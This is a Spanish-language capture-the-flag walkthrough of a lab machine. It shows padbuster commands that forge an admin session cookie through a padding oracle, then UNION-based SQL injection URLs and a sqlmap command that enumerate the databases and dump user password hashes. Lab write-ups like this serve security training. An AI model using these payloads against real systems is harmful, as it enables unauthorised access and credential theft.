PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http

-Entramos a la web del puerto 80 y no encontramos nada de valor a simple vista, la web no es muy interactiva

-Nos creamos un usuario en 'sign up' y nos autenticamos. Dentro vemos nada interesante tampoco.

-Nos damos cuenta que tenemos una Cookie de Sesión (la de nuestro usuario), podemos intentar hacer un **'Padding Oracle Attack'** , que consiste en **

-No estás robando una cookie existente: **estás fabricando una cookie con privilegios que normalmente no tendrías**.

## Padding Oracle Attack

-Para realizar el ataque, vamos a utilizar la herramienta **'Padbuster'**

-Nuestra Cookie de sesión es:
	auth=sJmJ4x1EU7%2FT3kBw4mvJiiDCmWDTg9Hd

-Empezamos el Ataque para que descubra el valor de nuestra Cookie en Texto Claro:
	-padbuster http://10.10.11.119/home/index.php sJmJ4x1EU7%2FT3kBw4mvJiiDCmWDTg9Hd --cookies "auth=sJmJ4x1EU7%2FT3kBw4mvJiiDCmWDTg9Hd" 8

-Respondemos a la siguiente Pregunta con '2':
	-NOTE: The ID# marked with ** is recommended : 2

-Resultado del Ataque:
	** Finished ***
	[+] Decrypted value (ASCII): user=carpx0
	[+] Decrypted value (HEX): 757365723D6361727078300505050505
	[+] Decrypted value (Base64): dXNlcj1jYXJweDAFBQUFBQ==

-Ahora le decimos que nos cree una nueva Cookie que en Texto Claro sea **user=admin**:
	-padbuster http://10.10.11.119/home/index.php sJmJ4x1EU7%2FT3kBw4mvJiiDCmWDTg9Hd --cookies "auth=sJmJ4x1EU7%2FT3kBw4mvJiiDCmWDTg9Hd" 8 -plaintext user=admin

-Volvemos a Responder 2:
	-NOTE: The ID# marked with ** is recommended : 2

-El Resultado Final es:
	[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
	(Esta es la Cookie de Admin)
-------------------------------------------------------------------------------------------------------------

-Aplicamos un Cookie Hijacking con la Cookie obtenida y entramos como Admin

-En el código fuente de la web vemos el siguiente enlace:
	-[../config/admin_last_login.js](view-source:http://10.10.11.119/config/admin_last_login.js)

-Entramos y descubrimos la siguiente ruta:
	-let url = 'http://overflow.htb/home/logs.php?name=admin'

-Vamos a la siguiente URL:
	-http://10.10.11.119/home/logs.php?name=admin
		Last login : 10:00:00
		Last login : 11:00:00
		Last login : 12:00:00
		Last login : 14:00:00
		Last login : 16:00:00

## SQLI Error Based - DB Enumeration

**-Detección Inicial:**
	-Probamos a poner una Comilla Simple al final:
		-http://10.10.11.119/home/logs.php?name=admin'
			Ya no nos salen los textos de 'Last Login'
		-Probamos a Comentar:
			-http://10.10.11.119/home/logs.php?name=admin'-- -
				Siguen sin salir
	-Probamos con ' + ):
		-http://10.10.11.119/home/logs.php?name=admin')
			No sale nada
		-http://10.10.11.119/home/logs.php?name=admin')-- -
			-**Ahora SI SALEN** los textos de 'Last Login'

-Ya sabemos que podemos hacer bypass de la Query con ')-- -

-Averiguar el Número de Columnas:
	-http://10.10.11.119/home/logs.php?name=admin') ORDER BY 3-- -
		SALE EL TEXTO, Con 4 no sale, **Tiene 3 Columnas**

-Nos enfrentamos ante una DB mysql:
	-http://10.10.11.119/home/logs.php?name=admin') UNION SELECT 1,2,@@version-- -

-Listamos todas las DBS:
	-http://10.10.11.119/home/logs.php?name=admin') UNION SELECT 1,2,schema_name FROM information_schema.schemata-- -
		**Last login : information_schema**
		**Last login : Overflow**
		**Last login : cmsmsdb**
		**Last login : logs**

-Listamos las Tablas de la DB 'cmsmsdb':
	-http://10.10.11.119/home/logs.php?name=admin') UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema='cmsmsdb'-- -
		-Nos llama la atención --> **Last login : cms_users**

-Listamos las Columnas de la Tabla 'cms_users':
	-http://10.10.11.119/home/logs.php?name=admin') UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='cms_users'-- -
		**Last login : username**
		**Last login : password**

-Listamos el Contenido de las Columnas 'username' y 'password':
	-http://10.10.11.119/home/logs.php?name=admin') UNION SELECT 1,2,GROUP_CONCAT(username,':',password) FROM cmsmsdb.cms_users-- -
		**Last login : admin:c6c6b9310e0e6f3eb3ffeb2baff12fdd,editor :e3d748d58b58657bfa4dffe2def0b1c7**

-NOTA: Con SQLMAP:
	-sqlmap -r sql.req --level=5 --risk=3 --threads=10 --batch --dbs
		[*] cmsmsdb
		[*] information_schema
		[*] logs
		[*] Overflow

-El resto de la Máquina no nos interesa




